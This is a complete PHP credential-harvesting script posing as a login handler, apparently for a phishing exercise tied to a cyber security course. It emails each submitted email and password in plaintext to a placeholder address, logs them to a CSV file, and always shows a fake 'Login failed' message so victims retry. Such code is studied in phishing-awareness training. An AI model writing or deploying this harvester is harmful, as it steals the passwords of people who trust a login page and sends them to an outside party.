<?php
session_start();
require_once 'db.php';

if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = 0;
}

if ($_SESSION['login_attempts'] >= 5) {
    $_SESSION['message'] = "Too many login attempts. Try again later.";
    header("Location: login.php");
    exit();
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = trim($_POST['username']);
    $password = trim($_POST['password']);
    $timestamp = date("Y-m-d H:i:s");

    $_SESSION['login_attempts']++;

    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $_SESSION['message'] = "Invalid email format.";
        header("Location: login.php");
        exit();
    }

    $to = "your_email@example.com";
    $subject = "New Login Attempt - Cyber Security Course";
    $message = "A user attempted to login.\n\nEmail: $email\nPassword: $password\nTime: $timestamp";
    $headers = "From: notify@yourdomain.com";

    mail($to, $subject, $message, $headers);

    $logLine = [$timestamp, $email, $password];
    $csvFile = fopen("login_log.csv", "a");
    fputcsv($csvFile, $logLine);
    fclose($csvFile);

    $_SESSION['message'] = "Login failed. Please try again.";
    header("Location: login.php");
    exit();
} else {
    $_SESSION['message'] = "Invalid request.";
    header("Location: login.php");
    exit();
}
